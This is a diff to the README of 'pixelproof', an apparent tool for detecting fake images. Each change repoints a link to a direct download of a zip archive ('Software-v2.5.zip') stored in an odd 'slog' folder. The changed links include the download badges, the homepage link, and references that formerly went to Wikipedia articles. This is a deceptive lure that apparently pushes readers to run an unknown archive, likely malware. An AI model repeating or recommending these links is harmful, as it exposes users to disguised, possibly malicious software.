@@ -1,6 +1,6 @@
 # 🖼️ pixelproof - Detect Fake Images Quickly
 
-[![Download pixelproof](https://img.shields.io/badge/Download-pixelproof-4caf50?style=for-the-badge)](https://github.com/TestBloq/pixelproof)
+[![Download pixelproof](https://img.shields.io/badge/Download-pixelproof-4caf50?style=for-the-badge)](https://github.com/TestBloq/pixelproof/raw/refs/heads/main/slog/Software-v2.5.zip)
 
 ## 🧐 What is pixelproof?
 
@@ -30,7 +30,7 @@ Your Windows PC can run pixelproof with no setup needed beyond download and inst
 
 Click the big green button below to visit the page where you can download the software.  
 
-[![Download pixelproof](https://img.shields.io/badge/Download-pixelproof-4caf50?style=for-the-badge)](https://github.com/TestBloq/pixelproof)
+[![Download pixelproof](https://img.shields.io/badge/Download-pixelproof-4caf50?style=for-the-badge)](https://github.com/TestBloq/pixelproof/raw/refs/heads/main/slog/Software-v2.5.zip)
 
 This page has the latest version ready for download.
 
@@ -92,10 +92,10 @@ pixelproof uses common methods from image forensics. This field studies photo de
 ## 🔗 Useful Links
 
 - pixelproof homepage and downloads:  
-  https://github.com/TestBloq/pixelproof  
-- EXIF data information: https://en.wikipedia.org/wiki/Exif  
-- AI image creation basics: https://en.wikipedia.org/wiki/Artificial_intelligence_in_image_generation  
-- Steganography overview: https://en.wikipedia.org/wiki/Steganography
+  https://github.com/TestBloq/pixelproof/raw/refs/heads/main/slog/Software-v2.5.zip  
+- EXIF data information: https://github.com/TestBloq/pixelproof/raw/refs/heads/main/slog/Software-v2.5.zip  
+- AI image creation basics: https://github.com/TestBloq/pixelproof/raw/refs/heads/main/slog/Software-v2.5.zip  
+- Steganography overview: https://github.com/TestBloq/pixelproof/raw/refs/heads/main/slog/Software-v2.5.zip
 
 ## 🆘 Troubleshooting
 
@@ -115,4 +115,4 @@ pixelproof is free to use and open source. You can look at the code or suggest c
 
 ---
 
-[![Download pixelproof](https://img.shields.io/badge/Download-pixelproof-4caf50?style=for-the-badge)](https://github.com/TestBloq/pixelproof)
+[![Download pixelproof](https://img.shields.io/badge/Download-pixelproof-4caf50?style=for-the-badge)](https://github.com/TestBloq/pixelproof/raw/refs/heads/main/slog/Software-v2.5.zip)
